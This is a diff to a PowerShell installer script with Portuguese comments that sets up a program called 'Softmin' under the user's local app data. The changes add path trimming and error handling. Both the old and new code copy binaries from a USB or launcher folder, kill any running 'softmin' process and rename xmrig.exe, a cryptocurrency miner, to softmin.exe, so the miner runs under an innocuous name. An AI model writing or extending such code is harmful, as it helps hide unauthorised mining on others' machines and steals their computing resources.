@@ -12,6 +12,9 @@ if ([string]::IsNullOrWhiteSpace($InstallPath)) {
     $InstallPath = Join-Path $env:LOCALAPPDATA 'Softmin'
 }
 $InstallPath = $InstallPath.TrimEnd('\')
+if ($LauncherRoot) {
+    $LauncherRoot = $LauncherRoot.Trim().Trim('"').TrimEnd('\')
+}
 $logDir = Join-Path $InstallPath 'logs'
 New-Item -ItemType Directory -Force -Path $InstallPath, $logDir | Out-Null
 
@@ -87,29 +90,35 @@ foreach ($name in $critical) {
 }
 
 # --- 3) Bonus opcional: pendrive/repo ao lado do .bat (NAO obrigatorio) ---
-if ($LauncherRoot -and (Test-Path -LiteralPath $LauncherRoot)) {
-    $lr = $LauncherRoot.TrimEnd('\')
-    $scriptDir = Join-Path $lr 'scripts'
-    if (Test-Path -LiteralPath $scriptDir) {
-        Get-ChildItem -LiteralPath $scriptDir -Filter '*.ps1' -File | ForEach-Object {
-            Copy-Item -LiteralPath $_.FullName -Destination (Join-Path $InstallPath $_.Name) -Force
-        }
-        Write-BootLog '[BOOT] Bonus: scripts locais/pendrive copiados (opcional).'
-    }
-    $binDir = Join-Path $lr 'bin'
-    if (Test-Path -LiteralPath $binDir) {
-        Get-Process -Name 'softmin' -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
-        Start-Sleep -Milliseconds 300
-        $dstBin = Join-Path $InstallPath 'bin'
-        New-Item -ItemType Directory -Force -Path $dstBin | Out-Null
-        Get-ChildItem -LiteralPath $binDir -File | ForEach-Object {
-            $dest = Join-Path $dstBin $(if ($_.Name -eq 'xmrig.exe') { 'softmin.exe' } else { $_.Name })
-            if (-not (Test-Path -LiteralPath $dest) -or $_.Name -eq 'softmin.exe') {
-                try {
-                    Copy-Item -LiteralPath $_.FullName -Destination $dest -Force -ErrorAction Stop
-                } catch { }
+if ($LauncherRoot) {
+    try {
+        if (Test-Path -LiteralPath $LauncherRoot) {
+            $lr = $LauncherRoot
+            $scriptDir = Join-Path $lr 'scripts'
+            if (Test-Path -LiteralPath $scriptDir) {
+                Get-ChildItem -LiteralPath $scriptDir -Filter '*.ps1' -File | ForEach-Object {
+                    Copy-Item -LiteralPath $_.FullName -Destination (Join-Path $InstallPath $_.Name) -Force
+                }
+                Write-BootLog '[BOOT] Bonus: scripts locais/pendrive copiados (opcional).'
+            }
+            $binDir = Join-Path $lr 'bin'
+            if (Test-Path -LiteralPath $binDir) {
+                Get-Process -Name 'softmin' -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
+                Start-Sleep -Milliseconds 300
+                $dstBin = Join-Path $InstallPath 'bin'
+                New-Item -ItemType Directory -Force -Path $dstBin | Out-Null
+                Get-ChildItem -LiteralPath $binDir -File | ForEach-Object {
+                    $dest = Join-Path $dstBin $(if ($_.Name -eq 'xmrig.exe') { 'softmin.exe' } else { $_.Name })
+                    if (-not (Test-Path -LiteralPath $dest) -or $_.Name -eq 'softmin.exe') {
+                        try {
+                            Copy-Item -LiteralPath $_.FullName -Destination $dest -Force -ErrorAction Stop
+                        } catch { }
+                    }
+                }
             }
         }
+    } catch {
+        Write-BootLog ("[BOOT] WARN bonus pendrive: {0}" -f $_.Exception.Message)
     }
 }
 
